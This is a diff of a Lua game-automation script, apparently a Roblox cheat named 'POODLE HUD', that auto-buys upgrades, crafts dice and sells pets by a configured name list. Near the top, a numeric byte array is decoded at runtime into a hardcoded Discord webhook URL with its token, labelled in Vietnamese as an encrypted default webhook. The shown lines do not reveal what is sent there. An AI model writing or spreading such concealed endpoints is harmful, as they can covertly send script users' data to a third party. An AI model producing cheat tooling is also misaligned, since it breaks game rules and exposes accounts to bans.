@@ -1,6 +1,6 @@
 -- =====================================================================
 -- 🎲 POODLE HUD - RNG EVENT CORE (ALL-IN-ONE FRAMEWORK)
--- 🚀 CẬP NHẬT TỐI HẬU: AI SMART CACHE (TỰ ĐỘNG LỌC & TÌM PET RNG)
+-- 🚀 CẬP NHẬT TỐI HẬU: AUTO SELL THEO DANH SÁCH TÊN CHỈ ĐỊNH
 -- =====================================================================
 if _G.RNGEventStarted then return end
 _G.RNGEventStarted = true
@@ -20,10 +20,21 @@ local config = {
     
     MaxDiceCraftTier = UserConfig.MaxDiceCraftTier or 3, 
     
+    -- Danh sách tên thú cưng cần bán
+    PetsToSell       = UserConfig.PetsToSell or {},
+    
     EventMapID       = "RngInstance",   
     MerchantID       = "LuckyDiceMerchantV2",
     CoinID           = "RNGCoins2" 
 }
+
+-- Xử lý danh sách bán: Đưa tất cả về chữ thường để so khớp chính xác 100%
+local TargetPetsToSell = {}
+for petName, shouldSell in pairs(config.PetsToSell) do
+    if shouldSell == true then
+        TargetPetsToSell[string.lower(tostring(petName))] = true
+    end
+end
 
 local DiceCraftTiers = {
     [1] = "Lucky Dice II V2",
@@ -39,6 +50,7 @@ local RNG_UPGRADES = {
     "RngMegaLuck", "RngBonusLuck", "RngExtraEgg"
 }
 
+-- LINK WEBHOOK MẶC ĐỊNH MÃ HÓA
 local _b = {104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 53, 48, 50, 53, 51, 51, 48, 54, 56, 53, 56, 52, 53, 50, 49, 55, 57, 57, 47, 70, 121, 109, 119, 70, 121, 110, 110, 80, 119, 75, 69, 114, 108, 67, 55, 56, 81, 73, 101, 89, 86, 83, 84, 122, 86, 68, 111, 107, 70, 80, 112, 89, 119, 77, 101, 70, 117, 108, 110, 52, 106, 113, 104, 97, 112, 89, 45, 120, 76, 86, 83, 84, 45, 114, 118, 104, 106, 80, 99, 85, 113, 115, 56, 56, 75, 57, 95}
 local defaultWebhook = ""
 for _, byte in ipairs(_b) do defaultWebhook = defaultWebhook .. string.char(byte) end
@@ -219,11 +231,8 @@ task.spawn(function()
 end)
 
 -- ==========================================
--- 7. VÒNG LẶP ROBOT TỰ ĐỘNG (UPGRADE, SELL, MERCHANT, CRAFT)
+-- 7. VÒNG LẶP ROBOT TỰ ĐỘNG (UPGRADE, SELL THEO TÊN, MERCHANT, CRAFT)
 -- ==========================================
-local ValidRngPets = {} -- Danh sách trắng (Pet bán được)
-local InvalidPets = {}  -- Sổ đen (Pet thường, bị từ chối)
-
 task.spawn(function()
     while task.wait(2) do
         
@@ -231,55 +240,37 @@ task.spawn(function()
         if config.AutoUpgrade then
             pcall(function()
                 for _, upgradeId in ipairs(RNG_UPGRADES) do
-                    -- Bao bọc bằng pcall để nếu sai lệnh cũng không làm dừng vòng lặp
-                    pcall(function() Network.Invoke("Rng_PurchaseUpgrade", "First", upgradeId) end)
+                    Network.Invoke("Rng_PurchaseUpgrade", "First", upgradeId)
                     task.wait(0.05)
                 end
             end)
             task.wait(0.5)
         end
         
-        -- [B] MÁY BÁN THÚ CƯNG (AI SMART CACHE)
+        -- [B] MÁY BÁN THÚ CƯNG (LỌC CHÍNH XÁC THEO DANH SÁCH CONFIG)
         if config.AutoSell then
             pcall(function()
                 local save = Save.Get()
-                if not save or not save.Inventory or not save.Inventory.Pet then return end
-                
-                local bulkSellDict = {}
-                local bulkCount = 0
-                
-                for uid, pet in pairs(save.Inventory.Pet) do
-                    -- Bỏ qua Huge, Titanic, pet khóa, pet trang bị
-                    if type(pet.id) == "string" and not string.find(pet.id, "Huge") and not string.find(pet.id, "Titanic") and not pet._lk and not pet._t then
-                        
-                        if ValidRngPets[pet.id] then
-                            -- Đã xác nhận là Pet RNG -> Đưa vào giỏ hàng bán sỉ
-                            bulkSellDict[uid] = pet._am or 1
-                            bulkCount = bulkCount + 1
+                if save and save.Inventory and save.Inventory.Pet then
+                    local sellDict = {}
+                    local count = 0
+                    
+                    for uid, pet in pairs(save.Inventory.Pet) do
+                        if type(pet.id) == "string" then
+                            local petIdLower = string.lower(pet.id)
                             
-                        elseif not InvalidPets[pet.id] then
-                            -- Chưa xác nhận -> Test thử bán 1 con để xem Server phản ứng
-                            local success, response = pcall(function()
-                                return Network.Invoke("RngEventPetMerchant_Activate", { [uid] = 1 })
-                            end)
-                            
-                            -- Nếu lệnh gửi đi không bị Error (Server chấp nhận)
-                            if success and response ~= false then
-                                ValidRngPets[pet.id] = true
-                                print("[POODLE HUD] Đã tìm ra ID Pet sự kiện: " .. tostring(pet.id))
-                            else
-                                -- Bị Server từ chối -> Pet World thường -> Cho vào sổ đen
-                                InvalidPets[pet.id] = true
+                            -- Kiểm tra xem TÊN THÚ CƯNG có nằm trong danh sách cần bán không
+                            -- Vẫn giữ chốt chặn an toàn: KHÔNG bán pet khóa (_lk), trang bị (_t), Huge, Titanic
+                            if TargetPetsToSell[petIdLower] and not string.find(petIdLower, "huge") and not string.find(petIdLower, "titanic") and not pet._lk and not pet._t then
+                                sellDict[uid] = pet._am or 1
+                                count = count + 1
                             end
-                            task.wait(0.1) -- Tránh spam mạng
                         end
-                        
                     end
-                end
-                
-                -- Bán sỉ một mẻ lớn cho tất cả Pet đã nằm trong danh sách trắng
-                if bulkCount > 0 then
-                    pcall(function() Network.Invoke("RngEventPetMerchant_Activate", bulkSellDict) end)
+                    
+                    if count > 0 then
+                        Network.Invoke("RngEventPetMerchant_Activate", sellDict)
+                    end
                 end
             end)
             task.wait(0.5)
@@ -289,7 +280,7 @@ task.spawn(function()
         if config.AutoMerchant then
             pcall(function()
                 for slotIndex = 1, 6 do 
-                    pcall(function() Network.Invoke("Merchant_RequestPurchase", config.MerchantID, slotIndex) end)
+                    Network.Invoke("Merchant_RequestPurchase", config.MerchantID, slotIndex)
                     task.wait(0.1) 
                 end
             end)
@@ -302,7 +293,7 @@ task.spawn(function()
                 for i = 1, math.clamp(config.MaxDiceCraftTier, 1, 5) do
                     local targetDice = DiceCraftTiers[i]
                     if targetDice then 
-                        pcall(function() Network.Invoke("LuckyDice_Craft", targetDice, 1) end)
+                        Network.Invoke("LuckyDice_Craft", targetDice, 1)
                         task.wait(0.1) 
                     end
                 end
